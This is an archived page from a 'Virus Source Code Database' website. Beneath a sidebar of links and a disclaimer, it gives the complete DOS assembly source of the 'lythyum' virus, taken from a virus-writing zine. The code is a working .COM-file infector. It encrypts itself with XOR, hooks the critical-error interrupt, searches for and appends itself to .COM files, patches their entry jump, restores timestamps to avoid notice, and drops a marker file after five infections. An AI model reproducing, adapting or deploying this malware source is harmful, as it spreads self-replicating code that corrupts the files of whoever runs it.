<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: lythyum_asm</title>
<meta name="KEYWORDS" content="lythyum.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for lythyum.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="lamark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lamark_asm.php">lamark_asm</a><br>
<a href="lct_599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_599_asm.php">lct_599_asm</a><br>
<a href="lct-599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-599_asm.php">lct-599_asm</a><br>
<a href="lct_762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_762_asm.php">lct_762_asm</a><br>
<a href="lct-762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-762_asm.php">lct-762_asm</a><br>
<a href="leap-fro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leap-fro_asm.php">leap-fro_asm</a><br>
<a href="leapfrog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leapfrog_asm.php">leapfrog_asm</a><br>
<a href="leech__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech__asm.php">leech__asm</a><br>
<a href="leech_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech_asm.php">leech_asm</a><br>
<a href="lehi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehi_asm.php">lehi_asm</a><br>
<a href="lehigh___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh___asm.php">lehigh___asm</a><br>
<a href="lehigh__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh__asm.php">lehigh__asm</a><br>
<a href="lehigh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh_asm.php">lehigh_asm</a><br>
<a href="lep-664a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lep-664a_asm.php">lep-664a_asm</a><br>
<a href="lepmisry_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lepmisry_asm.php">lepmisry_asm</a><br>
<a href="leprosb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosb2_asm.php">leprosb2_asm</a><br>
<a href="leprosy_2_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_2_c.php">leprosy_2_c</a><br>
<a href="leprosy_3_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_3_c.php">leprosy_3_c</a><br>
<a href="leprosy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy__asm.php">leprosy__asm</a><br>
<a href="leprosyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyb_asm.php">leprosyb_asm</a><br>
<a href="leprosy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_c.php">leprosy_c</a><br>
<a href="leprosyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyc_asm.php">leprosyc_asm</a><br>
<a href="leprsyb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb1_asm.php">leprsyb1_asm</a><br>
<a href="leprsyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb_asm.php">leprsyb_asm</a><br>
<a href="leps808d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leps808d_asm.php">leps808d_asm</a><br>
<a href="leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leszop_asm.php">leszop_asm</a><br>
<a href="libertyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/libertyb_asm.php">libertyb_asm</a><br>
<a href="lisa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa__asm.php">lisa__asm</a><br>
<a href="lisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa_asm.php">lisa_asm</a><br>
<a href="lisbon2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisbon2_asm.php">lisbon2_asm</a><br>
<a href="lit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lit_asm.php">lit_asm</a><br>
<a href="littl139_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/littl139_asm.php">littl139_asm</a><br>
<a href="little__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/little__asm.php">little__asm</a><br>
<a href="load_sec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/load_sec_asm.php">load_sec_asm</a><br>
<a href="lock2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock2_asm.php">lock2_asm</a><br>
<a href="lock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock_asm.php">lock_asm</a><br>
<a href="lockjaw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw__asm.php">lockjaw__asm</a><br>
<a href="lockjaw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw_asm.php">lockjaw_asm</a><br>
<a href="lockout2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout2_asm.php">lockout2_asm</a><br>
<a href="lockout_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout_asm.php">lockout_asm</a><br>
<a href="loki1237_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki1237_asm.php">loki1237_asm</a><br>
<a href="loki_973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki_973_asm.php">loki_973_asm</a><br>
<a href="loki-973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki-973_asm.php">loki-973_asm</a><br>
<a href="lokjawd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawd_asm.php">lokjawd_asm</a><br>
<a href="lokjawz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawz_asm.php">lokjawz_asm</a><br>
<a href="lordzero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lordzero_asm.php">lordzero_asm</a><br>
<a href="lqcancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lqcancer_asm.php">lqcancer_asm</a><br>
<a href="ltbro299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro299_asm.php">ltbro299_asm</a><br>
<a href="ltbro307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro307_asm.php">ltbro307_asm</a><br>
<a href="ltbro321_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro321_asm.php">ltbro321_asm</a><br>
<a href="ltbrt299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbrt299_asm.php">ltbrt299_asm</a><br>
<a href="lythyum_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lythyum_asm.php">lythyum_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

-] Dumped From VG's Infectious Diseases Magazine, Issue 2 [-

;      |----------> lythyum <---------|      ...it keeps me under control...
;      |-> By The Attitude Adjuster <-|      ...it keeps me wired...
;      |------------> of <------------| ...it keeps me sane...
;      |-----> ViRuLeNT GRaFFiTi <----|         ...it keeps me crazy...

;
;      My Modem Ate My Mom
;

; I am publishing this code, not because it is any good, because it is pure
; shit (look at all the space filling SHIT that I did. I could've used proc
; calls instead of jmp's, etc etc etc), but because I feel the need to 
; expose the universe to a trillion bad lythyum hacks. (shit, lythyum and
; the radyum series are already shittily coded!)

; This virus does not in any way reflect my current level of coding ability.
; At the time that this code was written, I could not infect EXE, SYS or
; MBR's. I could not disinfect on the fly, and I sure as hell couldn't
; do a full drive/full system transversal.

ComStart        Equ     100h                            ; Where .COM's start

.model tiny
.code
          Org     100h

lythyum:                                                ; We begin... N0W!
        Jmp     VirStart

        MarkerWord      Dw      4343h                   ; Marks Virii!

VirStart:
        Push    Cx                                      ; Why?
        Call    GetDelta

GetDelta:
        Pop     Bp                                      ; Get offset off
        Sub     Bp, Offset GetDelta                     ; stack and fix it
        Call    Encrypt
        Jmp     AfterDelta

XorByte         Dw      00h                             ; XoR Byte

Encrypt:
        Lea     Si, [Offset AfterDelta+Bp]              ; Source and Dest.
        Mov     Di, Si                                  ; The Same!
        Mov     Cx, Iet                                 ; Number of Times
E_Loop_1:
        LodSw
        Xor     Ax, word ptr [Offset XorByte+Bp]
        StoSw
        Loop    E_Loop_1
        ret
        endp

WriteFile:
        Push    Cx
        Call    Encrypt
        Pop     Cx
        Mov     Ah,40h
        Int     21h
        Call    Encrypt
        ret
        endp

AfterDelta:
        xor     ax,ax                                   ; Interrupt Table
        mov     ds,ax                                   ; Segment 0000h
        Sti
        mov     bx, word ptr ds:[24h*4]                 ; Move the stuff
        mov     es, word ptr ds:[92h]                   ; From the table
        mov     word ptr Cs:[offset I_24_Seg+bp], es    ; Into my code!
        mov     word ptr Cs:[offset I_24_Ofs+bp], bx
        Cli
        Push    Cs                                      ; We need this
        Pop     Es                                      ; Back too!
        lea     dx, Cs:[offset int_24h_entry+bp]         ; Fix in my code
        Sti
        mov     word ptr ds:[24h*4], dx
        mov     word ptr ds:[92h], cs
        Cli
        Push    Cs                                      ; Restore Data
        Pop     Ds                                      ; Segment

        Lea     Si, [Offset VirBuf+Bp]                  ; Restore first
        Mov     Di, ComStart                            ; 5 bytes
        Mov     Cx, 5

Restore_Loop:
        LodSb                                           ; The physical
        StoSb                                           ; work goes right
        Loop    Restore_Loop

        Mov     Ah, 2ch                                 ; Get time!
        Int     21h
        Mov     word ptr [offset XorByte+Bp], dx        ; New Encryption Val

        Mov     Ah, 1ah                                 ; Set it to inside
        Lea     Dx, [offset VirDta+Bp]                  ; the virus
        Int     21h

        Mov     Ah, 4eh                                 ; Find First Match
Find_Loop:
        Mov     Cx, 3                                   ; ReadOnly+Hidden
        Lea     Dx, [Offset Pathname+Bp]                ; Point to *.*
        Int     21h

        Jnc     Cont                                    ; If fucked, leave!
        Jmp     Quit


Cont:
        Mov     ax, word ptr [offset VirTime+Bp]        ; Save Time
        Mov     word ptr [offset FTime+Bp], ax

        Mov     ax, word ptr [offset VirDate+Bp]        ; Date
        Mov     word ptr [offset FDate+Bp], ax

        Mov     Ax, 4300h                               ; Get Attrib
        Lea     Dx, [offset VirName+Bp]
        Int     21h
        Mov     byte ptr [offset FAttr+Bp], cl          ; And save it

        Cmp     word ptr [bp+VirSizeL], (0FA00H - VirLen)       ; Too big?
        Ja      NotGood

        Cmp     word ptr [bp+VirSizeL], 1FFH                    ; Too small?
        Jb      NotGood

        Mov     Ax, 4301h                               ; Set Attribs to
        Xor     Cx, Cx                                  ; zlich...
        Lea     Dx, [offset VirName+Bp]
        Int     21h
        Jc      RollOut

        Mov     Ax, 3d02h                               ; Open Read/Write
        Lea     Dx, [offset VirName+Bp]                 ; Point to name
        Int     21h

        Mov     word ptr [offset handle+bp], Ax         ; Store Handle

        Mov     Ah, 3fh                                 ; Read File
        Mov     Bx, word ptr [offset handle+bp]         ; Get Handle
        Mov     Cx, 5                                   ; 5 Bytes
        Lea     Dx, [offset VirBuf+Bp]                  ; Buffer Address
        Int     21h

        Cmp     word ptr [offset IdentBuf+Bp], 4343h
        Jne     Kont
        Mov     Cx, 0EF0h
        Jmp     RollOut

Kont:
        Mov     Ax, 4202h                               ; Move File Pointer
        Xor     Cx, Cx                                  ; 0 from relative
        Xor     Dx, Dx                                  ; end.
        Int     21h

        Push    Ax                                      ; Put file size
        Push    Dx                                      ; on stack

        Inc     Byte Ptr [Offset Count+Bp]

        Mov     Cx, VirLen                              ; Virus Length
        Lea     Dx, [Offset VirStart+bp]                ; From Start of
        Int     3
        Call    WriteFile

        Mov     Ax, 4200h                               ; Move to top
        Xor     Cx, Cx                                  ; Of file
        Xor     Dx, Dx
        Int     21h

        Pop     Dx                                      ; Retrieve file size
        Pop     Ax                                      ; From stack
        Sub     Ax, 2                                   ; Construct JMP
        Mov     word ptr [JmpDsp+Bp], Ax

        Mov     Ah, 40h                                 ; Write JMP to
        Mov     Cx, 5                                   ; Top of file...
        Lea     Dx, [Offset workarea+bp]
        Int     21h
        Jmp     Rollout

NotGood:
        Mov     Ah, 4Fh                                 ; Find next file.
        Jmp     Find_Loop

Rollout:
        Push    Cx                                      ; In Case

        Mov     Ax, 5701h                               ; Restore
        Mov     Cx, word ptr [offset FTime+Bp]          ; time
        Mov     Dx, word ptr [offset FDate+Bp]          ; and date
        Int     21h

        Mov     Ah, 3eh                                 ; Close file
        Int     21h

        Mov     Ax, 4301h                               ; Restore
        Xor     Cx, Cx
        Mov     Cl, byte ptr [offset FAttr+Bp]          ; Attributes
        Lea     Dx, [Offset VirName+Bp]
        Int     21h

        Pop     Cx                                      ; Get back
        Cmp     Cx, 0EF0h                               ; And check
        Je      NotGood

        Cmp     Byte Ptr [Offset Count+Bp],5
        Jne     Quit

        Mov     Ah, 3ch
        Lea     Dx, [Offset IdentFile+Bp]
        Mov     Cx, 2
        Int     21h

        Jc      QuitIt
        Mov     Bx, Ax

        Mov     Ah, 40h
        Mov     Cx, Yet
        Lea     Dx, [Offset Unmentionable+Bp]
        Int     21h

QuitIt:
        Mov     Ah, 3eh                                 ; Close File
        Int     21h

Quit:
        Mov     Ah, 1ah                                 ; Set to default
        Mov     Dx, offset 0080h                        ; DTA
        Int     21h

        Xor     Ax, Ax                                  ; Set back to
        Mov     Ds, Ax                                  ; Seg 0000h
        Mov     bx, word ptr [offset I_24_Ofs+bp]
        mov     es, word ptr [offset I_24_Seg+bp]

        Sti
        mov     word ptr ds:[24h*4], bx                 ; Restore old int 24
        mov     word ptr ds:[92h], es
        Cli

        Push    Cs                                      ; Restore SEGS
        Pop     Es
        Push    Cs                                      ; Both...
        Pop     Ds

        Pop     Cx
        Xor     Ax, Ax
        Xor     Bx, Bx
        Mov     Dx, offset 100h
        Push    Dx
        Ret     0FFFFh                                  ; Whoopy Shit

Int_24h_Entry   Proc    Far
        Mov     Ax, 3                                   ; Process Terminate
        Iret                                            ; Do a LOT, Eh?
        EndP

Unmentionable   db      0,'lythyum, the attitude adjuster, ViRuLeNT GRaFFiTi',0
Count           Db      0                               ; Infection Count
IdentFile       Db      '\lythyum.hi!',00               ; Ident File Name
PathName        Db      '*.COM',0                       ; File to get
VirBuf          Db      90h,90h,90h                     ; Storage Buffer
IdentBuf        Db      0CDh,20h                        ; Ident Check Buff
WorkArea        Db      0E9h
JmpDsp          Db      00h,00h                         ; Work on JMP
VirIdent        db      43h,43h

CodeEnd:
Handle          Dw      ?                       ; File Handle

I_24_Seg        Dw      ?                       ; Int 24h Seg
I_24_Ofs        Dw      ?                       ; Int 24h Offset

VirDta          Db      21 DUP(?)               ; Holds My DTA
VirAttr         Db      ?                       ; F I L E   A T T R
VirTime         Dw      ?                       ; F I L E   T I M E
VirDate         Dw      ?                       ; F I L E   D A T E
VirSizeL        Dw      ?                       ; F I L E   S I Z E   L O W
VirSizeH        Dw      ?                       ; F I L E   S I Z E   H I
VirName         db      13 DUP(?)               ; F I L E   N A M E

FAttr           db      ?
FTime           dw      ?
FDate           dw      ?

VirLen  = offset CodeEnd - offset Virstart
Iet     = offset(CodeEnd-Offset AfterDelta) / 2
Yet     = Offset Count - Offset Unmentionable

        End             lythyum

</textarea></td></tr></table></body></html>
